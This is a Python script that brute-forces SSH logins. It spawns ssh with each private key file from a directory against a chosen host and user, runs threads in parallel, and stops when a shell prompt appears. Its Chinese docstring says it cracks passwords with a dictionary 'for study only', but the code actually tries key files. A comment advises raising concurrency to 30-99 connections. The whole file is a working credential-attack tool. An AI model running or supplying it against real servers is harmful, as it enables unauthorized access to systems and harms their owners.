# coding=UTF-8 
import pexpect
import optparse
import os 
import threading
"""
本脚本用过密码字典暴力破解远程ssh密码。
仅供学习,请勿用于其他用途。
"""
maxConnections = 5 #每次最大连接数,亲自试验建议设为30-99
connection_lock = threading.BoundedSemaphore(value=maxConnections)#线程连接数，每个线程最大连接数
Stop  = False #破解状况，初始化为false
Fails = 0

def connect(user, host, keyfile, release):    
	global Stop, Fails    
	try:        
		perm_denied = 'Permission denied (publickey,gssapi-keyex,gssapi-with-mic).'        
		ssh_newkey = 'Are you sure you want to continue connecting'        
		conn_closed = 'Connection closed by remote host'
		connStr = 'ssh ' + user + '@' + host + ' -i ' + keyfile       
		child = pexpect.spawn(connStr)        
		ret = child.expect([pexpect.TIMEOUT,  perm_denied, ssh_newkey, conn_closed, '$' , '#', ])        
		if ret == 2:            
			print('[-] Adding Host to ∼/.ssh/known_hosts')            
			child.sendline('yes')            
			connect(user, host, keyfile, False)        
		elif ret == 3:            
			print('[-] Connection Closed By Remote Host')
			Fails += 1        
		elif ret > 3:            
			print('[+] Success. ' + str(keyfile)) 
			Stop = True    
	finally:
		if release:            
			connection_lock.release() 

def main():    
	parser = optparse.OptionParser('usage%prog -H <target host> -u <user> -d <directory>')    
	parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')    
	parser.add_option('-d', dest='passDir', type='string', help='specify directory with keys')    
	parser.add_option('-u', dest='user', type='string', help='specify the user')    
	(options, args) = parser.parse_args()    
	host = options.tgtHost    
	passDir = options.passDir    
	user = options.user    
	if host == None or passDir == None or user == None:        
		print(parser.usage)        
		exit(0)    
	for filename in os.listdir(passDir):        
		if Stop:            
			print('[*] Exiting: Key Found.')            
			exit(0)
		if Fails > 5:            
			print('[!] Exiting: Too Many Connections Closed By Remote Host.')            
			print('[!] Adjust number of simultaneous threads.')            
			exit(0)        
		connection_lock.acquire()        
		fullpath = os.path.join(passDir, filename)        
		print('[-] Testing keyfile ' + str(fullpath))        
		t = threading.Thread(target=connect, args=(user, host, fullpath, True))        
		t.start() 

if __name__ == '__main__':    
	main()
